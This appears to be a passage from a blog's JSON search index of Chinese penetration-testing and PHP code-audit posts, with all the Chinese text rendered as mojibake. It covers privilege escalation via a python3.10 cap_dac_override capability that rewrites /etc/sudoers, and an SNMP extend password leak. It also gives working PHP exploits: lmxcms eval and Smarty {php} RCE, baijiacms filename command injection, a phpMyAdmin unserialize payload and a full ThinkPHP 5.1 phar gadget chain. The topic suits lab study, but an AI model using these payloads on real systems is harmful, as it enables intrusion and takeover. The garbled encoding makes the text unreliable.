æ‰§è¡Œä»»ä½•æ–‡ä»¶ï¼Œå¿½ç•¥æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæƒé™ä½é™åˆ¶ï¼‰ã€‚CAP_NET_RAWï¼šå…è®¸åˆ›å»ºåŸå§‹ç½‘ç»œå¥—æ¥å­—ï¼ˆç”¨äºæŠ“åŒ…ç­‰æ“ä½œï¼‰ã€‚2. cap_dac_override=ep çš„å«ä¹‰è¿™æ˜¯è®¾ç½®è¿›ç¨‹èƒ½åŠ›çš„è¯­æ³•ï¼Œæ ¼å¼ä¸º [èƒ½åŠ›åç§°]=[æ ‡å¿—]ï¼Œå…¶ä¸­ï¼šcap_dac_overrideï¼šæŒ‡å®šè¦èµ‹äºˆçš„èƒ½åŠ›ï¼ˆå¦‚ä¸Šé¢æ‰€è¯´ï¼Œç”¨äºç»•è¿‡æ–‡ä»¶æƒé™æ£€æŸ¥ï¼‰ã€‚epï¼šæ˜¯èƒ½åŠ›çš„æ ‡å¿—ä½ç»„åˆï¼šeï¼ˆEffectiveï¼‰ï¼šè¯¥èƒ½åŠ›å¤„äº â€œç”Ÿæ•ˆâ€ çŠ¶æ€ï¼Œè¿›ç¨‹å½“å‰å¯ä»¥ä½¿ç”¨è¿™ä¸ªèƒ½åŠ›ã€‚pï¼ˆPermittedï¼‰ï¼šè¯¥èƒ½åŠ›è¢« â€œå…è®¸â€ï¼Œè¿›ç¨‹å¯ä»¥åœ¨éœ€è¦æ—¶å°†å…¶åˆ‡æ¢ä¸ºç”Ÿæ•ˆçŠ¶æ€ï¼ˆe æ ‡å¿—ä¾èµ– p æ ‡å¿—ï¼‰ã€‚/usr/bin/python3.10 cap_dac_override=ep é€šå¸¸æ˜¯åœ¨å¯åŠ¨ python3.10 è¿›ç¨‹æ—¶ï¼Œä¸ºå…¶èµ‹äºˆ CAP_DAC_OVERRIDEæ‰€ä»¥å¯ä»¥ä¸çœ‹æ¯”å¦‚rootæƒé™ç›´æ¥ç»•è¿‡æ–‡ä»¶æƒé™æ£€æŸ¥æ— éœ€åˆ‡æ¢åˆ° root ç”¨æˆ·cap_dac_override æ˜¯ Linux ä¸­ â€œæ–‡ä»¶è®¿é—®æƒé™â€ çš„ â€œè¶…çº§é€šè¡Œè¯â€ï¼Œæ‹¥æœ‰å®ƒçš„è¿›ç¨‹å¯ä»¥æ— è§†æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæƒé™ä½ï¼Œç›´æ¥æ“ä½œåŒ…æ‹¬ root æ‰€æœ‰çš„æ–‡ä»¶ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯¥èƒ½åŠ›è¢«è§†ä¸ºé«˜é£é™©æƒé™ï¼Œæ»¥ç”¨ä¼šä¸¥é‡å¨èƒç³»ç»Ÿå®‰å…¨ã€‚ è¯»å–åˆ—è¡¨ usrbinpython3.10 -c â€˜import os;print(os.listdir(â€œrootâ€))â€™ mini@readfile:/$ /usr/bin/python3.10 -c import os;print(os.listdir(/root))[proof.txt, .bashrc, .Xauthority, .bash_history, .cache]mini@readfile:/$ è¯»å–æ–‡ä»¶ usrbinpython3.10 -c â€˜print(open(â€œrootproof.txtâ€).read())â€™ mini@readfile:/$ /usr/bin/python3.10 -c print(open(/root/proof.txt).read())15ea28dcdd363fbb1feaf8798cffee17 å†™å…¥æ–‡ä»¶åˆ°etcsudoers mini@readfile:/$ /usr/bin/python3.10 -c with open(/etc/sudoers,a)as f: f.write(mini ALL=(ALL:ALL) NOPASSWD: ALL )mini@readfile:/$ sudo -lMatching Defaults entries for mini on readfile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser mini may run the following commands on readfile: (ALL : ALL) NOPASSWD: ALLmini@readfile:/$ è§£é‡Šä¸‹ç¬¬ä¸€ä¸ªall å“ªäº›ä½ç½®å¯ä»¥ç”¨ç¬¬äºŒä¸ªall å¯åˆ‡æ¢çš„ç”¨æˆ·ç¬¬ä¸‰ä¸ªall å¯åˆ‡æ¢çš„ç»„ç¬¬ä¸‰ä¸ªall å¯æ‰§è¡Œçš„å‘½ä»¤ ç™»å½•root mini@readfile:/$ sudo su rootroot@readfile:/# root@readfile:/# ls -al æ€»ç»“æ–‡ä»¶é…ç½®åœ¨ extend password_leak /bin/bash /usr/local/bin/get_password_info.shroot@readfile:~# cat /usr/local/bin/get_password_info.sh#!/bin/bashecho Please change your old password mini:hereismyP@ssword!root@readfile:~# cat /etc/snmp/snmpd.confå¼•å…¥æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼ˆç±»ä¼¼ snmpd.conf.d ç›®å½•ä¸­çš„æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨åŠ è½½ï¼‰ã€‚includeDir /etc/snmp/snmpd.conf.dextend password_leak /bin/bash /usr/local/bin/get_password_info.shè¿‡ extend æŒ‡ä»¤åˆ›å»ºè‡ªå®šä¹‰ SNMP æ‰©å±•ï¼Œå°†è„šæœ¬ /usr/local/bin/get_password_info.sh çš„è¾“å‡ºæŒ‚è½½åˆ° SNMP çš„ OID ä¸Šã€‚ 1 SNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰ï¼šç”¨äºç½‘ç»œè®¾å¤‡ç›‘æ§å’Œç®¡ç†çš„åè®®ï¼Œå¸¸è§ç‰ˆæœ¬æœ‰ v1ã€v2cï¼ˆç¤¾åŒºå­—ç¬¦ä¸²è®¤è¯ï¼‰ã€v3ï¼ˆåŠ å¯†å’Œè®¤è¯ï¼‰ã€‚2 ç¤¾åŒºå­—ç¬¦ä¸²ï¼ˆCommunity Stringï¼‰ï¼šv1/v2c ä¸­çš„è®¤è¯å‡­è¯ï¼Œç±»ä¼¼å¯†ç ï¼Œrocommunityä¸ºåªè¯»æƒé™ï¼Œrwcommunityä¸ºè¯»å†™æƒé™ï¼ˆå¦‚helloæ˜¯ä½ ä½¿ç”¨çš„åªè¯»å­—ç¬¦ä¸²ï¼‰ã€‚3 OIDï¼ˆå¯¹è±¡æ ‡è¯†ç¬¦ï¼‰ï¼šSNMP ä¸­æ ‡è¯†ç›‘æ§é¡¹çš„å”¯ä¸€è·¯å¾„ï¼Œé‡‡ç”¨æ ‘çŠ¶ç»“æ„ï¼ˆå¦‚.1.3.6.1.4.1.8072.1.3.2æ˜¯ net-snmp æ‰©å±•åŠŸèƒ½çš„é»˜è®¤è·¯å¾„ï¼‰ã€‚4 net-snmp æ‰©å±•åŠŸèƒ½ï¼šé€šè¿‡extendæŒ‡ä»¤åœ¨ snmpd.conf ä¸­é…ç½®ï¼Œå¯å°†è‡ªå®šä¹‰è„šæœ¬è¾“å‡ºæŒ‚è½½åˆ°ç‰¹å®š OIDï¼Œå®ç°è‡ªå®šä¹‰ç›‘æ§é¡¹ï¼ˆå¦‚æ³„éœ²å¯†ç ä¿¡æ¯ï¼‰ã€‚5 snmpwalk å‘½ä»¤ï¼šç”¨äºéå† SNMP ä»£ç†çš„ OID æ ‘ï¼Œæ ¼å¼ä¸ºsnmpwalk -vç‰ˆæœ¬ -cç¤¾åŒºå­—ç¬¦ä¸² ç›®æ ‡IP [OID]ï¼Œå¯è·å–æŒ‡å®š OID çš„ä¿¡æ¯ã€‚å®éªŒæ€§ OIDï¼ˆ.8072ï¼‰ï¼šIANA é¢„ç•™çš„ç”¨äºæµ‹è¯•çš„ä¼ä¸š IDï¼Œå¸¸è¢« net-snmp ç­‰å·¥å…·ç”¨äºè‡ªå®šä¹‰æ‰©å±•ï¼Œéå®˜æ–¹æ ‡å‡† OIDã€‚6 SNMP å®‰å…¨é£é™©ï¼šå¼±ç¤¾åŒºå­—ç¬¦ä¸²ã€é”™è¯¯é…ç½®çš„æ‰©å±• OID å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ã€ç³»ç»Ÿæ•°æ®ï¼‰ï¼Œv1/v2c ä¼ è¾“ä¸åŠ å¯†ï¼Œå­˜åœ¨çªƒå¬é£é™©ã€‚Linux capabilitiesï¼ˆèƒ½åŠ›æœºåˆ¶ï¼‰ï¼šå°† root æƒé™æ‹†åˆ†ä¸ºç»†ç²’åº¦ç‰¹æƒï¼Œè¿›ç¨‹å¯ä»…è·å–å¿…è¦æƒé™ï¼ˆå¦‚cap_dac_overrideå…è®¸ç»•è¿‡æ–‡ä»¶æƒé™æ£€æŸ¥ï¼‰ã€‚7 cap_dac_override=epï¼šä¸ºè¿›ç¨‹èµ‹äºˆç»•è¿‡æ–‡ä»¶ DAC æƒé™æ£€æŸ¥çš„èƒ½åŠ›ï¼Œå…è®¸è®¿é—® / ä¿®æ”¹åŸæœ¬æ— æƒé™çš„æ–‡ä»¶ï¼ˆåŒ…æ‹¬ root æ‰€æœ‰æ–‡ä»¶ï¼‰ã€‚8 rbashï¼ˆå—é™ bashï¼‰ï¼šé™åˆ¶ç”¨æˆ·æ“ä½œï¼Œå¦‚ç¦æ­¢cdã€ä¿®æ”¹ç¯å¢ƒå˜é‡ã€ä½¿ç”¨ç»å¯¹è·¯å¾„æ‰§è¡Œå‘½ä»¤ï¼Œå¯é€šè¿‡bash -iç­‰æ–¹å¼çªç ´ï¼ˆä¾èµ–é…ç½®ç¼ºé™·ï¼‰ã€‚9 /etc/sudoersé…ç½®ï¼šæ§åˆ¶ç”¨æˆ·sudoæƒé™ï¼Œæ ¼å¼ä¸ºç”¨æˆ·å ä¸»æœº=(ç”¨æˆ·:ç»„) å‘½ä»¤ï¼ŒNOPASSWD:å…³é”®å­—å¯å®ç°å…å¯†æ‰§è¡Œã€‚10 Bash å¼•å·è§„åˆ™ï¼šå•å¼•å·ï¼ˆï¼‰å†…å†…å®¹å®Œå…¨åŸæ ·ä¿ç•™ï¼Œä¸å¯åµŒå¥—å•å¼•å·ï¼›åŒå¼•å·ï¼ˆï¼‰å†…è§£æå˜é‡ï¼Œå¯åŒ…å«å•å¼•å·ï¼Œé¿å…è¯­æ³•å†²çªã€‚","tags":["rbash","smtp"]},{"title":"MVC-PHPä»£ç å®¡è®¡2","path":"/2025/09/27/posts/code4phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡-RCE-å®¡è®¡-ç‰ˆæœ¬å¯¹æ¯”å·¥å…· å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯MVCæ‰¾åˆ°å…·ä½“çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­\tææ¸…æ¥šè·¯ç”±\tææ¸…æ¥šé…ç½®æ–‡ä»¶\tææ¸…æ¥šæ˜¯å¦æ˜¯å¼€å‘æ¡†æ¶å¦‚ TP YII å¦‚æ˜¯åˆ™ç”¨å·²çŸ¥æ¼æ´æ¥æ‰“ æ¡ˆä¾‹ä¸€lmx1.4RCE-è¯»å–æ•°æ®åº“é€ æˆRCEä»£ç å…³é”®ä½ç½®åœ¨adminæ–‡ä»¶å¤¹ä¸‹é¢çš„AcquisiAction.class.php å…³é”®ä»£ç  æˆ‘ä»¬è®¿é—®åº”è¯¥admin.php?mAcquisiashowCjDatacid1lid1id1 è®°å¾—å¾€æ•°æ®åº“é‡Œé¢æ”¾ä¸œè¥¿ public function showCjData() $cjData = $this-model-getOneCjData($this-lid); $jdData = $this-model-getOne($this-id); $fieldData = $GLOBALS[allfield][$jdData[mid]]; $temdata = $this-model-caijiDataOne($_GET[cid]); $this-smarty-assign(jdData,$jdData); $this-smarty-assign(cjData,$cjData); $fieldData = tool::arrV2K($fieldData,fname); eval($data = .$temdata[data].;); caijiDataoneæ˜¯ä¸€ä¸ªsqlè¯­å¥æŸ¥è¯¢id id=$cid public function caijiDataOne($id) $this-cj_data_tab(); $param[where] = id=.$id; return parent::oneModel($param);æ˜¯ä¸æ˜¯æˆ‘ä»¬å…ˆä¼ å…¥æ•°æ®åˆ°æ•°æ®åº“ç„¶åä¼šæ”¾åˆ°evalæ‰§è¡Œä»¥phpæ‰§è¡Œå°±å˜æˆäº†RCEäº†å‘¢æˆ‘ä»¬å…ˆæ€æ­»hi å½“çš„æ•°æ®åº“æœ‰phpä»£ç ä»–ä¹Ÿä¼šæ‰§è¡Œ æ€»ç»“ $temdataselect * from lmx_cj_data where id xx æ˜¯ä¸€ä¸ªæ•°ç»„ ä¸‹é¢å–å‡ºæ•°ç»„ä¸­çš„dataæ¥æ‰§è¡Œ eval(â€˜$data â€˜.$temdata[â€˜dataâ€™].â€™;â€™);è¯»å–çš„æ˜¯æ•°æ®åº“ä¸­çš„dataå­—æ®µ é€šè¿‡eval()æ‰§è¡Œ $data = æ•°ç»„å­—ç¬¦ä¸²; lmx1.4RCE-åå°sstiæ³¨å…¥-smartè¯­æ³•çœ‹ä»£ç å‘ç°plugä¸‹é¢æœ‰ä½¿ç”¨smartæ’ä»¶ åŠ å…¥åˆ°index.htmlæœ€å {include fileâ€c:windowswin.iniâ€} è¯»å–æ–‡ä»¶ {php}phpinfo();{php} æ‰§è¡Œphpä»£ç  ä»£ç å®¡è®¡å¯¹æ¯”å·¥å…·å½“ä½ åœ¨ä»£ç å®¡è®¡å‘ç°ä¸åŒç‰ˆæœ¬æ—¶å€™å¯ä»¥ç”¨å·¥å…·æ¥å¯¹æ¯”ä»£ç  WinMerge-2.16.50.2-x64-Setup è¿˜è®°å¾—å‰å°çš„sqlæ³¨å…¥å— è¿™é‡Œæ¸…é™¤çš„çœ‹åˆ°äº†ç›´æ¥å¯¹GETè¿›è¡Œè¿‡æ»¤è¿˜æ²¡åˆ°æ•°æ®åº“é‡Œé¢å°±æ²¡äº† æ¡ˆä¾‹2-baijiacms-RCEâ€“å‘½ä»¤æ‰§è¡ŒbaijiacmsV4-4.1.4\\includes\\baijiacms\\common.inc.php https://www.cnvd.org.cn/flaw/show/CNVD-2021-12800 å®‰è£…ç”¨5ç‰ˆæœ¬çš„php å®‰è£…éº»çƒ¦æ­»äº† æœç´¢system( çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶å«common.inc.php function file_save($file_tmp_name,$filename,$extention,$file_full_path,$file_relative_path,$allownet=true) $settings=globaSystemSetting(); if(!file_move($file_tmp_name, $file_full_path)) return error(-1, ä¿å­˜ä¸Šä¼ æ–‡ä»¶å¤±è´¥); if(!empty($settings[image_compress_openscale])) $scal=$settings[image_compress_scale]; $quality_command=; if(intval($scal)0) $quality_command= -quality .intval($scal); system(convert.$quality_command. .$file_full_path. .$file_full_path); intvalæ˜¯å¦æ•´æ•°0 è®©ä»–å°äº0\t$settings[image_compress_openscaleä¸ä¸ºç©º ç„¶åæˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªsystemè¿™æ—¶å€™åˆ†æå‡½æ•°å˜é‡æ˜¯å¦å¯æ§ 1ï¼š$quality_commandè¿™ä¸ªå˜é‡ä¸è¡Œå› ä¸ºç©ºäº† è€Œä¸”æ˜¯æ•°å­—æ²¡ä»€ä¹ˆç”¨å•Š â€‹ é‚£æˆ‘ä»¬å°±çœ‹file_full_path ä¹Ÿå°±æ˜¯å‡½æ•°çš„ç¬¬å››ä¸ª â€‹\tåŒæ—¶if(!empty($settings[â€˜image_compress_openscaleâ€™])) ä¸ä¸ºç©º 2ï¼š ç„¶åæˆ‘ä»¬ç‚¹å‡»è°å¼•ç”¨äº†å‘ç°- systemweixinclasswebsetting.phpå¼•ç”¨äº† å®ƒæ»¡è¶³äº†ç¬¬å››ä¸ªå˜é‡å¯æ§ $extention = pathinfo($file[name], PATHINFO_EXTENSION); $extention=strtolower($extention); if($extention==txt) $substr=substr($_SERVER[PHP_SELF], 0, strrpos($_SERVER[PHP_SELF], /)); if(empty( $substr)) $substr=/; $verify_root= substr(WEB_ROOT./,0, strrpos(WEB_ROOT./, $substr))./; //file_save($file[tmp_name],$file[name],$extention,$verify_root.$file[name],$verify_root.$file[name],false); file_save($file[tmp_name],$file[name],$extention,WEB_ROOT./.$file[name],WEB_ROOT./.$file[name],false); 3ï¼šé‚£æˆ‘ä»¬æ€ä¹ˆè®¿é—®è¿™ä¸ªé¡µé¢å‘¢ å¯¹åº”äº†system - manager - template - web - store_display http://localhost:906/index.php?mod=siteact=managerdo=storeop=displaybeid=1 è¿™æ˜¯æ ¹ç›®å½• systemweixinclasswebsetting.phpè¦åˆ°è¿™ä¸ªåœ°æ–¹ http://localhost:906/index.php?mod=siteact=weixindo=setting æœç„¶çœ‹åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ åŒæ—¶è¦æ»¡è¶³ä¸ä¸ºç©º -é€šè¿‡å¼•ç”¨äº†æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ systemmanagertemplatewebnetattach.php æ„é€ è®¿é—®ç›®å½• http://localhost:906/index.php?mod=siteact=managerdo=netattach å¯ä»¥å‘ç°è®¾ç½®ä¸º1å¯ä»¥ä¸ä¸ºç©ºæ‰€ä»¥æˆ‘ä»¬æŠŠåŠŸèƒ½æ‰“å¼€ åˆ©ç”¨è¿‡ç¨‹é€šè¿‡ä¸Šä¼ åæŠ“åŒ… if($extention==txt) é¦–å…ˆåç¼€æ˜¯txtæ‰èƒ½è¿‡å»ä»–ç›´æ¥æ‹¼æ¥æˆ‘ä»¬ä¸Šä¼ çš„åå­—æˆ‘ä»¬å¯ä»¥ç”¨è¿æ¥ç¬¦å¦‚whoami ipconfigå¦‚ 1231321321333333whoami è™½ç„¶å‰é¢æŠ¥é”™ä½†æ˜¯åé¢ä¾æ—§æ‰§è¡Œæ‰€ä»¥æˆ‘ä»¬å‘åŒ…Content-Disposition: form-data; name=weixin_verify_file; filename=calc.txt ä¿®æ”¹åçœ‹ä¼šä¸ä¼šå¼¹å‡º å¯ä»¥å‘ç°ç›´æ¥å¼¹å‡ºäº†è®¡ç®—å™¨ ä¼ å…¥ calc ä¼šæ‰§è¡Œ calcï¼Œæ— éœ€é¢å¤–å¼•å·ï¼ˆå› ä¸ºåŸä»£ç æ²¡æœ‰ç”¨å¼•å·åŒ…è£¹å˜é‡ï¼‰ï¼›","tags":["php"]},{"title":"MVC-PHPä»£ç å®¡è®¡3-ååºåˆ—åŒ–-åŸç”Ÿ-æ¡†æ¶-phar","path":"/2025/09/27/posts/code5phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡3-ååºåˆ—åŒ–-åŸç”Ÿ-æ¡†æ¶ åŸç”Ÿåºåˆ—åŒ–é­”æœ¯æ–¹æ³•\t__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘ __sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘ __destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ __call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ __invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ 1ï¼šæœç´¢åºåˆ—åŒ–å‡½æ•° æ¡ˆä¾‹ä¸€admin2-ä»»æ„è¯»å–æ–‡ä»¶æœç´¢ååºåˆ—åŒ–unserializeå…³é”®å­—æœç´¢åˆ° setup.php if (isset($_POST[configuration]) $action != clear ) // Grab previous configuration, if it should not be cleared $configuration = unserialize($_POST[configuration]); else // Start with empty configuration $configuration = array();ç„¶åæˆ‘ä»¬æŸ¥çœ‹wakeupé­”æœ¯æ–¹æ³• åœ¨config.class.phpä¸­å‘ç°ä¸€ä¸ªwakeupæ–¹æ³• function __wakeup() if ( $this-source_mtime !== filemtime($this-getSource()) || $this-error_config_file || $this-error_config_default_file ) $this-settings = array(); $this-load($this-getSource()); $this-checkSystem(); // check for https needs to be done everytime, // as https and http uses same session so this info can not be stored // in session $this-checkIsHttps(); $this-checkCollationConnection(); function getSource() return $this-source; --------------------loadå‡½æ•°è°ƒç”¨äº†eval------------------------------- function load($source = null) $this-loadDefaults(); if ( null !== $source ) $this-setSource($source); if ( ! $this-checkConfigSource() ) return false; $cfg = array(); /** * Parses the configuration file */ $old_error_reporting = error_reporting(0); if ( function_exists(file_get_contents) ) $eval_result = eval( ? . file_get_contents($this-getSource()) ); else $eval_result = eval( ? . implode( , file($this-getSource())) ); åˆ†æï¼š actionä¸ä¸ºclear configuration ååºåˆ—åŒ–å¿…é¡»æœ‰å€¼ getsourceæ˜¯evalæ§åˆ¶çš„å€¼ æˆ‘ä»¬å°±æŠŠä»–ä¿®æ”¹ä¸ºæ–‡ä»¶å å› ä¸ºå‰é¢æœ‰filegetcontent æˆ‘ä»¬å°±å…ˆç”Ÿæˆååºåˆ—åŒ–é“¾ ?phpclass PMA_Configvar $source = d://1.txt;$un=new PMA_Config;echo serialize($un);?ç»“æœæ˜¯O:10:PMA_Config:1:s:6:source;s:9:d://1.txt;ç„¶åpostå‘åŒ… æˆåŠŸè¯»å–æ–‡ä»¶å†…å®¹ æ¡ˆä¾‹äºŒ-KITECMS-TPæ¡†æ¶-åå°-PHARåˆ¤æ–­æ˜¯ä¸æ˜¯ç”¨äº†æ¡†æ¶\tç›®å½•æ–‡ä»¶åå­—\tæ–‡ä»¶ä»£ç æœ‰TPçš„å¼•ç”¨\tä»£ç æœ‰TPçš„é€»è¾‘\treadmeé‡Œé¢è¯´äº†\tæœç´¢ç‰ˆæœ¬ const VERSION = 5.1.37 LTS;æ¡†æ¶å°±æ˜¯å®ç°äº†æ¨¡å‹ä½ ç›´æ¥ç”¨å°±è¡Œï¼Œä½†æ˜¯æ¡†æ¶æœ‰æ¼æ´ä½ ç”¨ä½ çš„ä»£ç å°±ä¼šæœ‰æ¼æ´å‚è€ƒï¼šhttps://www.anquanke.com/post/id/187819Pharåˆ©ç”¨æ¡ä»¶:å¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()ï¼Œis_dirç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°,è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ å®‰è£…åè¾“å…¥install å®‰è£…å¯èƒ½éœ€è¦é…ç½®ä¼ªé™æ€ä»£ç  æ‰“å¼€æºç å°±å¼¹å‡ºäº†readmeæ–‡ä»¶é‡Œé¢è¯´æ˜äº†æ˜¯ä½¿ç”¨äº†tpæ¡†æ¶ ç”Ÿæˆpharæ–‡ä»¶ç„¶åä¸Šä¼ ä¸Šå» è¦å…³é—­phpç‰ˆæœ¬ä¸­çš„readonly ;phar.readonly On è¿™æ˜¯é»˜è®¤å¼€å¯çš„è¦å…³é—­ æŠŠå‰é¢åˆ†å·åˆ é™¤åé‡å¯ç”Ÿæ•ˆ äº§ç”Ÿæ–‡ä»¶åå¯ä»¥æ‰“å¼€ä¸»è¦æ˜¯äº§ç”Ÿæ–‡ä»¶ è®¿é—®åç”Ÿæˆpharæ–‡ä»¶ ?phpnamespace think\\process\\pipes class Windows private $files; public function __construct($files) $this-files = array($files); namespace think\\model\\concern trait Conversion protected $append = array(smi1e = 1); trait Attribute private $data; private $withAttr = array(smi1e = system); public function get() $this-data = array(smi1e = notepad); namespace think abstract class Model use model\\concern\\Attribute; use model\\concern\\Conversion; namespace think\\model use think\\Model; class Pivot extends Model public function __construct() $this-get(); namespace $conver = new think\\model\\Pivot(); $a = new think\\process\\pipes\\Windows($conver); $phar = new Phar(xiaodi.phar); $phar - stopBuffering(); $phar - setStub(GIF89a.?php __HALT_COMPILER();?); $phar - addFromString(test.txt,test); $phar - setMetadata($a); $phar - stopBuffering();? http://localhost:908/admin/passport/login.html ç™»å½•ç•Œé¢åå° applicationadmincontrollerAdmin.phpæ–‡ä»¶ æ‰¾åˆ°çš„æ§åˆ¶ç‚¹ æˆ‘ä»¬å°±æŒ‰ç…§ä¸Šé¢é‚£ä¸ªè®¿é—® adminadminscanFiles æ¥è§¦å‘è¯•è¯• function scanFiles($dir) if (!is_dir($dir)) return []; // å…¼å®¹å„æ“ä½œç³»ç»Ÿ $dir = rtrim(str_replace(\\\\, /, $dir), /)./; // æ ˆï¼Œé»˜è®¤å€¼ä¸ºä¼ å…¥çš„ç›®å½• $dirs = array($dir); // æ”¾ç½®æ‰€æœ‰æ–‡ä»¶çš„å®¹å™¨ $rt = []; do // å¼¹æ ˆ $dir = array_pop($dirs); // æ‰«æè¯¥ç›®å½• $tmp = scandir($dir); foreach($tmp as $f) if ($f == . || $f == ..) continue; // ç»„åˆå½“å‰ç»å¯¹è·¯å¾„ $path = $dir.$f; // å¦‚æœæ˜¯ç›®å½•ï¼Œå‹æ ˆã€‚ if (is_dir($path)) array_push($dirs, $path./); else if (is_file($path)) // å¦‚æœæ˜¯æ–‡ä»¶ï¼Œæ”¾å…¥å®¹å™¨ä¸­ $rt[] = $path; while ( $dirs ); // ç›´åˆ°æ ˆä¸­æ²¡æœ‰ç›®å½• return $rt; è¾“å…¥ä½ç½®ä¼ å…¥å‚æ•°ç›´æ¥å¼¹å‡ºæ–‡æœ¬ åªè¦æ˜¯æ–‡ä»¶å‡½æ•° ä¸”æ–‡ä»¶å¯æ§åˆ¶ ç‰ˆæœ¬ç¬¦åˆpoc å°±å¯ä»¥è§¦å‘pharåè®®ååºåˆ—åŒ–ï¼Œå¦‚å‘é€æ•°æ®åŒ…é‡Œé¢æœ‰å¯æ§çš„ä¹Ÿå¯ä»¥å¦‚POST","tags":["php"]},{"title":"MVC-PHPä»£ç å®¡è®¡","path":"/2025/09/26/posts/code3phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡- å…ˆåˆ¤æ–­æ˜¯ä¸æ˜¯MVCæ‰¾åˆ°å…·ä½“çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­\tææ¸…æ¥šè·¯ç”±\tææ¸…æ¥šé…ç½®æ–‡ä»¶\tææ¸…æ¥šæ˜¯å¦æ˜¯å¼€å‘æ¡†æ¶å¦‚ TP YII å¦‚æ˜¯åˆ™ç”¨å·²çŸ¥æ¼æ´æ¥æ‰“ MVCæ¨¡å‹åˆ†ä¸ºæ§åˆ¶å±‚ æœåŠ¡å±‚ è§†å›¾å±‚ ä¹Ÿæœ‰å‰åç«¯äº¤äº’çš„MVCåªæä¾›æ¥å£æ˜¯ç›®å‰çš„ä¸»æµï¼Œç„¶åå‰ç«¯å¦‚VUEæ¥åŠ¨æ€æ¸²æŸ“ åˆ¤æ–­MVCæ¨¡å‹http://localhost:905/index.php?m=lista=indexclassid=1 æ¯”å¦‚è¿™ç§mxxaxxclassidxx ä½†æ˜¯index.phpæ ¹æœ¬æ²¡æœ‰è¿™ç§GET ?php /** * ã€æ¢¦æƒ³cmsã€‘ http://www.lmxcms.com * * å‰å°å…¥å£æ–‡ä»¶ */define(LMXCMS,TRUE);define(RUN_TYPE,index);require dirname(__FILE__)./inc/config.inc.php;require dirname(__FILE__)./inc/run.inc.php;? æ­£ç¡®æ˜¯åœ¨indexæ–‡ä»¶å¤¹listAction.class.php-indexæ–¹æ³•-classidä¼ å‚ æ‰€ä»¥æ˜¯Index.phpå¼€å¤´æŒ‡å®šåœ¨indexæ–‡ä»¶å¤¹ æ‰€ä»¥listæ–‡ä»¶åå­— indexæ–¹æ³• classidå‚æ•° ListAction.class.phpå†…å®¹å¦‚ä¸‹?php /** * ã€æ¢¦æƒ³cmsã€‘ http://www.lmxcms.com * * å‰å°æ ç›®é¡µé¢æ§åˆ¶å™¨ */defined(LMXCMS) or exit();class ListAction extends HomeAction private $classid; public function __construct() parent::__construct(); $this-classid = (int)$_POST[classid] ? (int)$_POST[classid] : (int)$_GET[classid]; if(!$this-classid || !isset($GLOBALS[allclass][$this-classid])) _404(); if($GLOBALS[allclass][$this-classid][classtype] == 2) //å¤–éƒ¨é“¾æ¥ç›´æ¥è·³è½¬ rewrite::php_url($GLOBALS[allclass][$this-classid][classurl]); public function index() $temModel = new parse($this-smarty); if($GLOBALS[allclass][$this-classid][classtype] == 0) $model = new ContentModel($this-classid); else if($GLOBALS[allclass][$this-classid][classtype] == 1) $model = new ColumnModel(); echo $temModel-lists($this-classid,$model); ? æ¡ˆä¾‹lmxcms1.4-å‰å°Sqlæ³¨å…¥æ ¹æ®CNVDæä¾›TagsAction.class.phpæ–‡ä»¶å­˜åœ¨sqlæ³¨å…¥ æˆ‘ä»¬æ€ä¹ˆè®¿é—®è¿™æ–‡ä»¶å‘¢é€šè¿‡mvc index.php?mtagsaxxxx è¿™æ ·è®¿é—® ?php /** * ã€æ¢¦æƒ³cmsã€‘ http://www.lmxcms.com * * Tagsæ§åˆ¶å™¨ */defined(LMXCMS) or exit();class TagsAction extends HomeAction private $data; private $tagsModel = null; public function __construct() parent::__construct(); $data = p(2,1,1); $name = string::delHtml($data[name]); 